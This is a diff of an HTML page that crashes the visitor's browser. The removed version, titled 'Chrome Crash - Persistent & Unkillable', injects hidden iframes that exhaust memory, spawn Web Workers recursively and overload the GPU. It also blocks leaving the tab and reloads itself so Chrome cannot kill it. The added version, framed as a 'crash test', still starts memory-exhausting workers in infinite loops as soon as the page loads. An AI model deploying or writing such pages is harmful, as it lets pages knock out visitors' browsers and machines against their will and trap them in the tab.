@@ -1,86 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Chrome Crash - Persistent & Unkillable</title>
+    <title>Browser Crash Test - Extreme Memory Overload</title>
 </head>
 <body>
-    <h1>Chrome Crash - Maximum Overload</h1>
-    <p>The attack starts automatically.</p>
+    <h1>Browser Crash Test - Extreme Memory Overload</h1>
+    <p>If your browser crashes, the test was successful.</p>
 
     <script>
-        function injectHiddenIframes(numFrames) {
-            for (let i = 0; i < numFrames; i++) {
-                let iframe = document.createElement("iframe");
-                iframe.style.display = "none"; 
-                iframe.src = "data:text/html;charset=utf-8," + encodeURIComponent(`
-                    <script>
-                        function overloadMemory() {
-                            let memArray = [];
-                            function allocate() {
-                                memArray.push(new Array(1e7).fill(0)); 
-                                requestAnimationFrame(allocate); 
-                            }
-                            allocate();
-                        }
-                        overloadMemory();
-
-                        function recursiveWorkers() {
-                            let code = \`onmessage = function() { postMessage("Spawn more workers"); while (true) { new Float64Array(1e8); } }\`;
-                            let blob = new Blob([code], { type: "application/javascript" });
-                            let workers = [];
-                            function spawnWorkers() {
-                                let worker = new Worker(URL.createObjectURL(blob));
-                                worker.postMessage("Start");
-                                worker.onmessage = () => {
-                                    if (workers.length < navigator.hardwareConcurrency * 30) {
-                                        workers.push(worker);
-                                        spawnWorkers();
-                                    }
-                                };
-                            }
-                            for (let i = 0; i < navigator.hardwareConcurrency * 15; i++) {
-                                spawnWorkers();
-                            }
-                        }
-                        recursiveWorkers();
-
-                        var canvas = document.createElement('canvas');
-                        var gl = canvas.getContext('webgl');
-                        function crashGPU() {
-                            let shaders = [];
-                            function runShaders() {
-                                var shader = gl.createShader(gl.VERTEX_SHADER);
-                                gl.shaderSource(shader, 'attribute vec3 aPosition; void main() { gl_Position = vec4(aPosition, 1.0); }');
-                                gl.compileShader(shader);
-                                shaders.push(shader);
-                                gl.getShaderParameter(shader, gl.COMPILE_STATUS);
-                                requestAnimationFrame(runShaders);
-                            }
-                            runShaders();
-                        }
-                        crashGPU();
-                    <\/script>
-                `);
-                document.body.appendChild(iframe);
-            }
+        function startWorker() {
+            let code = `
+                let data = [];
+                while (true) {
+                    data.push(new Float64Array(1e8)); // Uses more memory
+                }
+            `;
+            let blob = new Blob([code], { type: "application/javascript" });
+            let worker = new Worker(URL.createObjectURL(blob));
         }
 
-        function preventClosing() {
-            window.onbeforeunload = function() {
-                return "This page is trying to prevent you from leaving.";
-            };
+        for (let i = 0; i < navigator.hardwareConcurrency * 4; i++) { // Uses 4x CPU cores
+            startWorker();
         }
-
-        function restartProcessLoop() {
-            setInterval(() => {
-                location.reload(); // Keep refreshing to avoid Chrome killing the process
-            }, 5000);
-        }
-
-        // Inject multiple hidden iframes running the persistent attack
-        injectHiddenIframes(30); 
-        preventClosing(); // Prevent user from closing the tab normally
-        restartProcessLoop(); // Restart attack if Chrome tries to kill it
     </script>
 </body>
 </html>
